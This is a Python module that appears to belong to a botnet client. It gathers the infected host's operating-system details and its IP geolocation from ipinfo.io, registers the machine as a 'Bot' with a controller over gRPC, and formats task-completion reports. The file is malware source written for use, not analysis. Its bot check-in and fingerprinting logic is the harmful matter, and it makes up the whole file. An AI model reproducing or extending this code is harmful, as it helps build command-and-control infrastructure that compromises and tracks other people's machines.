import platform
import urllib.request
import json
from protos.botnet_pb2 import *
from protos.botnet_pb2_grpc import *
from bot.modules import tiempo

def get_data():
    array = []
    geo = []
    info = platform.uname()
    for i in info:
    	array.append(i)
    g = urllib.request.urlopen("https://ipinfo.io/json")
    data = g.read()
    strdata = data.decode("utf8")
    g.close()
    j = json.loads(strdata)
    for d in j:
    	geo.append(j[d])
    return array, geo

def set_connection(client, id, status):
    data, geo = get_data()
    client.SetConnection(Bot(bot_id=id, status=status, system=data[0], node=data[1], release=data[2], version=data[3], machine=data[4], processor=data[5], geo=Geo(ip=geo[0], hostname=geo[1], city=geo[2], region=geo[3], country=geo[4], loc=geo[5])))

def disconnect(task):
    date_finish = tiempo.get_time()
    return Task(task_id=task.task_id, bot_id=task.bot_id, type=task.type, status="OK", date_start=task.date_start, date_finish=date_finish)
